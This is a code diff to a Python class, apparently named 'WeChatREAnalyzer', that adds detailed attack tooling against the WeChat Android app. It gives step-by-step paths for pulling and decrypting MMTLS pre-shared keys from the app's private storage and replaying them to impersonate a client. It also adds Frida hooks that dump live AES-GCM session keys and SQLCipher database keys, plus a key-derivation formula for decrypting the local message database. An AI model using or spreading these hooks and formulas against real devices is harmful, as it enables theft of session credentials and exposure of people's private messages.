@@ -301,6 +301,18 @@ class WeChatREAnalyzer:
                 "PSKs are serialized (MAX_SERIALIZED_PSK_LEN enforced) and stored as\n"
                 "  encrypted_refresh_psk + encrypted_ticket in ClientCredStorage.\n"
                 "On reconnect, WeChat sends PSK in 0-RTT mode (HS_MODE_ZERO_RTT_PSK).\n"
+                "\n"
+                "On-disk file: /data/data/com.tencent.mm/files/mmtls/%08llx (hex session ID)\n"
+                "File format: [IV 12B][ciphertext N bytes][GCM auth tag 16B]\n"
+                "\n"
+                "PSK encryption key source candidates (ranked by likelihood):\n"
+                "  1. HARDCODED: 16/32-byte entropy blob in libwechatnetwork.so .rodata\n"
+                "     → scan: python3 -c \"d=open('libwechatnetwork.so','rb').read(); "
+                "[print(hex(i),d[i:i+32].hex()) for i in range(0,len(d)-32,4) "
+                "if d[i:i+32].count(0)<4 and all(d[i+j]!=0 for j in range(0,32,4))]\"\n"
+                "  2. DEVICE-DERIVED: HKDF(ANDROID_ID | UIN, salt=hardcoded, info='mmtls')\n"
+                "  3. ANDROID KEYSTORE: unlikely (performance; getEncoded() returns null)\n"
+                "\n"
                 "Attack: extract PSK from device storage → replay as WeChat client without\n"
                 "  completing ECDH handshake. Requires access to app private data dir."
             ),
@@ -312,13 +324,34 @@ class WeChatREAnalyzer:
                            "size == encrypted_refresh_psk.size()",
                            "mmtls: MAX_SERIALIZED_PSK_LEN=%d, read read size=%zu",
                            "(state_.mode() != HS_MODE_ZERO_RTT_PSK && app_data != NULL)"],
+                "file_path": "/data/data/com.tencent.mm/files/mmtls/%08llx",
+                "file_format": "IV[12] || AES-GCM-ciphertext || tag[16]",
             },
             "attack_path": (
                 "1. Root device or ADB backup on unpatched device\n"
-                "2. Pull /data/data/com.tencent.mm/ (MicroMsg/ directory)\n"
-                "3. Locate ClientCredStorage file (likely SharedPreferences or MMKV)\n"
-                "4. Deserialize PSK using mmtls_lib proto format\n"
-                "5. Replay with mmtls client using 0-RTT mode"
+                "2. adb shell run-as com.tencent.mm ls files/mmtls/\n"
+                "3. Pull /data/data/com.tencent.mm/files/mmtls/<hex> files\n"
+                "4. Determine encryption key: hook EVP_DecryptInit_ex arg4 in libwechatnetwork.so\n"
+                "5. Decrypt: IV=bytes[0:12], tag=bytes[-16:], ciphertext=bytes[12:-16]\n"
+                "6. Deserialize PSK using mmtls_lib proto format\n"
+                "7. Replay with mmtls client using 0-RTT mode (HS_MODE_ZERO_RTT_PSK)"
+            ),
+            "frida_hook": (
+                "// Find PSK file path via open() intercept\n"
+                "Interceptor.attach(Module.findExportByName('libc.so', 'open'), {\n"
+                "  onEnter(args) {\n"
+                "    const path = args[0].readCString();\n"
+                "    if (path && path.includes('mmtls')) console.log('[mmtls open]', path);\n"
+                "  }\n"
+                "});\n"
+                "// Extract AES-GCM key from EVP_DecryptInit_ex\n"
+                "const EVP_Di = Module.findExportByName('libssl.so', 'EVP_DecryptInit_ex');\n"
+                "if (EVP_Di) Interceptor.attach(EVP_Di, {\n"
+                "  onEnter(args) {\n"
+                "    if (!args[3].isNull()) console.log('[PSK key]', hexdump(args[3], {length:32}));\n"
+                "    if (!args[4].isNull()) console.log('[PSK iv]',  hexdump(args[4], {length:12}));\n"
+                "  }\n"
+                "});"
             ),
         })
 
@@ -332,20 +365,66 @@ class WeChatREAnalyzer:
                 f"VA: 0x{GILIINKKEY_VA:x}, size: {GILIINKKEY_SIZE} bytes\n"
                 "Contains live MMTLS session key material for the active connection.\n"
                 "Frida: read from memory after LongLinkWithMMTLS constructor returns.\n"
-                "ptrace: PTRACE_PEEKDATA on WeChat PID at resolved VA after lib load."
+                "ptrace: PTRACE_PEEKDATA on WeChat PID at resolved VA after lib load.\n"
+                "\n"
+                "Struct layout hypotheses (72 bytes = 9×8B or mixed):\n"
+                "  H1 (dual-cipher): AES-256-key[16] | SM4-key[16] | GCM-nonce[12] |\n"
+                "                    PSK-identity[16] | session-id[8] | flags[4]\n"
+                "  H2 (single-cipher): key[32] | nonce[12] | counter[4] | pad[24]\n"
+                "Confirm by tracing EVP_EncryptInit_ex args: arg3=key ptr, arg4=nonce ptr,\n"
+                "measuring byte distance from gILinkKey base.\n"
+                "\n"
+                "ARM64 RE note: LDP instruction loads two consecutive 8-byte fields\n"
+                "simultaneously — LDP x19, x20, [x0, #0x10] loads +0x10 and +0x18.\n"
+                "Ctor entry point: LongLinkWithMMTLSC1E @ 0x1ab2c4; expect prologue:\n"
+                "  stp x29, x30, [sp, #-N]! then stp x19, x20, [sp, #M] (callee save)\n"
+                "  then str/stp to [x0, #field_offset] for member initialization."
             ),
             "evidence": {
                 "symbol": "_ZN5mmtls9gILinkKeyE",
                 "va": hex(GILIINKKEY_VA),
                 "size": GILIINKKEY_SIZE,
                 "section": "BSS (GLOBAL OBJECT)",
+                "ctor_va": "0x1ab2c4 (LongLinkWithMMTLSC1E)",
+                "key_deriv_errors": [
+                    "0x625eb: 'hkdf expand connection key fail'",
+                    "0x7b4f3: 'compute connection keys fail'",
+                    "0x7022a: 'hash for derving connection key fail'",
+                ],
             },
             "frida_hook": (
                 "// Read gILinkKey from running WeChat process\n"
                 "const libnet = Process.getModuleByName('libwechatnetwork.so');\n"
-                "const keyAddr = libnet.base.add(0x{:x});\n"
-                "const keyBytes = keyAddr.readByteArray({});\n"
-                "console.log(hexdump(keyBytes));".format(GILIINKKEY_VA, GILIINKKEY_SIZE)
+                "const keyAddr = libnet.base.add(0x{va:x});\n"
+                "console.log('[gILinkKey dump]');\n"
+                "console.log(hexdump(keyAddr, {{length: {sz}}}));\n"
+                "\n"
+                "// Catch init moment via MemoryAccessMonitor\n"
+                "MemoryAccessMonitor.enable({{base: keyAddr, size: {sz}}}, {{\n"
+                "  onAccess(d) {{\n"
+                "    if (d.operation === 'write') {{\n"
+                "      console.log('[gILinkKey write] from', d.from, 'offset', d.rangeIndex);\n"
+                "      console.log(Thread.backtrace(this.context, Backtracer.ACCURATE)\n"
+                "        .map(DebugSymbol.fromAddress).join('\\n'));\n"
+                "    }}\n"
+                "  }}\n"
+                "}});\n"
+                "\n"
+                "// Hook EVP_EncryptInit_ex to correlate key/nonce offsets\n"
+                "const EVP_Ei = Module.findExportByName('libssl.so', 'EVP_EncryptInit_ex');\n"
+                "if (EVP_Ei) Interceptor.attach(EVP_Ei, {{\n"
+                "  onEnter(args) {{\n"
+                "    const keyPtr = args[3]; const ivPtr = args[4];\n"
+                "    if (!keyPtr.isNull()) {{\n"
+                "      const off = keyPtr.sub(keyAddr).toInt32();\n"
+                "      console.log('[EVP key] gILinkKey+' + off, hexdump(keyPtr, {{length:32}}));\n"
+                "    }}\n"
+                "    if (!ivPtr.isNull()) {{\n"
+                "      const off = ivPtr.sub(keyAddr).toInt32();\n"
+                "      console.log('[EVP iv]  gILinkKey+' + off, hexdump(ivPtr, {{length:12}}));\n"
+                "    }}\n"
+                "  }}\n"
+                "}});".format(va=GILIINKKEY_VA, sz=GILIINKKEY_SIZE)
             ),
         })
 
@@ -377,10 +456,40 @@ class WeChatREAnalyzer:
             "key_formula": (
                 "# Confirmed from static RE (etype=0 path, MD5, 16-byte output → 7-char hex):\n"
                 "import hashlib\n"
-                "def wechat_db_key(imei: str, uin: str) -> str:\n"
-                "    raw = (imei + uin).encode('utf-8')\n"
+                "def wechat_db_key(imei_or_android_id: str, uin: str) -> str:\n"
+                "    # API <= 28: imei = TelephonyManager.getDeviceId() or getImei(0)\n"
+                "    # API >= 29: IMEI access restricted; WeChat falls back to ANDROID_ID:\n"
+                "    #   adb shell settings get secure android_id\n"
+                "    raw = (imei_or_android_id + uin).encode('utf-8')\n"
                 "    return hashlib.md5(raw).hexdigest()[:7]\n"
-                "# Open DB: sqlcipher EnMicroMsg.db -> PRAGMA key='<7chars>';"
+                "# Open DB (SQLCipher 3.x params):\n"
+                "#   sqlcipher EnMicroMsg.db\n"
+                "#   PRAGMA key='<7chars>';\n"
+                "#   PRAGMA cipher_compatibility=3;\n"
+                "#   .tables"
+            ),
+            "frida_hook": (
+                "// Hook sqlite3_key to capture the key at open time\n"
+                "['sqlite3_key', 'sqlite3_key_v2'].forEach(name => {\n"
+                "  const fn = Module.findExportByName(null, name);\n"
+                "  if (fn) Interceptor.attach(fn, {\n"
+                "    onEnter(args) {\n"
+                "      const nBytes = args[name === 'sqlite3_key' ? 2 : 3].toInt32();\n"
+                "      const kPtr  = args[name === 'sqlite3_key' ? 1 : 2];\n"
+                "      console.log('[' + name + '] key =', kPtr.readUtf8String(nBytes));\n"
+                "    }\n"
+                "  });\n"
+                "});\n"
+                "// Hook MessageDigest.update to catch MD5 input (IMEI+UIN concatenation)\n"
+                "Java.perform(() => {\n"
+                "  const MD = Java.use('java.security.MessageDigest');\n"
+                "  MD.update.overload('[B').implementation = function(b) {\n"
+                "    const alg = this.getAlgorithm();\n"
+                "    if (alg === 'MD5') console.log('[MD5 input]',\n"
+                "      Java.use('java.lang.String').$new(b, 'UTF-8'));\n"
+                "    return this.update(b);\n"
+                "  };\n"
+                "});"
             ),
         })
 
